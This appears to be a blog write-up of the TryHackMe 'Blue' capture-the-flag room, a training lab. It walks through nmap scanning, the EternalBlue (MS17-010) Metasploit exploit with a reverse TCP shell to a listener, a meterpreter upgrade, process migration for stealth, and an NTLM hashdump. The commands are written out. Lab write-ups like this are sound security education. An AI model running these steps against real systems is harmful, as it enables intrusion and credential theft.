---
title: "Blue"
date: 2025-06-10
draft: false
summary: "Writeup for Blue CTF challenge on TryHackMe."
tags: ["windows", "smb", "rce"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/blue/cover.webp"
  caption: "Blue TryHackMe Challenge"
  alt: "Blue cover"
platform: "TryHackMe"
---

Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/blue

## Scanning

I performed an **nmap** scan to find open ports and the services running on them.

```shell
nmap -sV TARGET --min-rate 10000 -oN blue.nmap -Pn
```

![](https://cdn.ziomsec.com/blue/1.webp)

I ran a vulnerable script scan for **SMB** and found that the target was vulnerable to **MS17-010**.

```shell
nmap -p 139,445 --script=vuln TARGET -T5
```

![](https://cdn.ziomsec.com/blue/2.webp)

## Foothold

I started metasploit and selected the exploit for this vulnerability.

```shell
msfconsole
use windows/smb/ms17_010_eternalblue
```

![](https://cdn.ziomsec.com/blue/3.webp)

I then configured the listener IP (`LHOST`), Target IP (`RHOSTS`) and Payload (`windows/x64/shell/reverse_tcp`) and ran the exploit to get a reverse shell

```shell
set LHOST LISTENER_IP
set RHOST TARGET_IP
set Payload windows/x64/shell/reverse_tcp
run
```

![](https://cdn.ziomsec.com/blue/4.webp)

Now, to upgrade this shell to meterpreter, I pressed `CTRL + Z` and ran the `shell_to_meterpreter` post module

```shell
# press CTRL+Z to background the session
use post/multi/manage/shell_to_meterpreter
set session ID
run
```

![](https://cdn.ziomsec.com/blue/5.webp)
![](https://cdn.ziomsec.com/blue/6.webp)

Finally, I spawned a **meterpreter** session and got **NT AUTHORITY/SYSTEM** access on the target.

```shell
sessions -i METERPRETER_ID
```

![](https://cdn.ziomsec.com/blue/7.webp)

I listed the running processes. Migrating to a legitimate process would make our exploit more stealthy so I migrated to **wininit.exe**.

```shell
ps
migrate WININT_PID
```

![](https://cdn.ziomsec.com/blue/8.webp)

![](https://cdn.ziomsec.com/blue/9.webp)

Finally, I used **`hashdump`** to dump NTLM hashes from the target.

```shell
hashdump
```

![](https://cdn.ziomsec.com/blue/10.webp)

I then cracked the hash of Jon using **Crackstation**.

![](https://cdn.ziomsec.com/blue/11.webp)

I then searched for all the flags that we had to capture and accessed them.

```shell
search -f "flag1.txt"
search -f "flag2.txt"
search -f "flag3.txt"
```

![](https://cdn.ziomsec.com/blue/12.webp)

![](https://cdn.ziomsec.com/blue/13.webp)

## Closure

Here's a short summary of how I pwned **Blue**:
- **nmap** scan revealed SMB service running on the target.
- I enumerated the SMB version using **nse** scripts and found it was vulnerable to ms17-010
- I used **metasploit** to exploit the SMB vulnerability and got a generic shell as NT Authority/System
- I upgraded this shell to meterpreter using **metasploit**'s `shell_to_meterpreter` post module.
- I then dumped user hashes and captured all three flags.

That's it from my side!
Until next time :)

---
